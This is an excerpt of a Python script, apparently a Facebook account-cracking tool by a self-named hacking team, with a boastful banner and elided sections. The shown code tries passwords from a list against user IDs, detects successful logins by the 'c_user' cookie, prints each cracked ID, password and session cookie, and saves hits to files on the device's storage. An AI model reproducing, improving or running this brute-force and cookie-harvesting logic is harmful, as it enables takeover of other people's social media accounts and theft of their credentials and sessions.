#SC MAKED BY zafar hussain 🤣 and Fuked By FB-KING 🙄

#Tera pappa FB-KING 😘 ZAFAR HUSSAIN
...
║  [+] WHATSAPP : 030€$$√5*68                                                                                         ║
║  [+] TEAM     :   Cyber 420 ZH-JOIYA                                                                 ║
║  [+] CREATOR  : ZAFAR HUSSAIN                                                                               ║
║  [+] VERSION  : 5.0.0                                                                                             ║
╚═════════════════════════════════════════════╝""")
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100091051282312/')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[ZH-JOIYA-OK💛] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")

                open('/sdcard/ZH-JOIYA/ok.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\x1b[38;5;196m[ZH-JOIYA-CP🔒] {uid}|{ps}")

                open('/sdcard/ZAFAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
